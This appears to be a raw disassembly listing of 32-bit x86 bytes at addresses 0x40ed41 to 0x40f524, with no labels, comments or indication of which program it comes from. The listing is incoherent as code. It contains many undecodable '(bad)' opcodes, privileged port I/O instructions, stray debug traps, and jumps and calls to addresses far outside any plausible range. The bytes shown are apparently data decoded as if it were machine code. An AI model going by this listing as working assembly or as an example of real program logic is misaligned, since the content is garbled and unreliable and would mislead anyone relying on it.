  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
  40f4e0:	(bad)  
  40f4e1:	or     BYTE PTR [eax],ah
  40f4e3:	dec    ebp
  40f4e4:	inc    DWORD PTR [eax+0x4]
  40f4e7:	push   ecx
  40f4e8:	add    BYTE PTR [edx-0x1],dh
  40f4eb:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  40f4f1:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  40f4fb:	add    ecx,DWORD PTR [ecx-0xf037477]
  40f501:	push   ecx
  40f502:	xor    BYTE PTR [ebx],al
  40f504:	inc    ebp
  40f505:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  40f50b:	(bad)  
  40f50c:	push   eax
  40f50e:	inc    DWORD PTR [eax]
  40f510:	inc    ebp
  40f511:	add    BYTE PTR [ebx],dh
  40f513:	add    BYTE PTR [ebx],0x0
  40f516:	mov    DWORD PTR [ebx-0x150007d4],eax
  40f51c:	lea    edx,[ebp-0x6c]
  40f51f:	je     0x40f4a6
  40f521:	(bad)  
  40f522:	dec    DWORD PTR [eax]
  40f524:	call   DWORD PTR [ebp-0x7b]
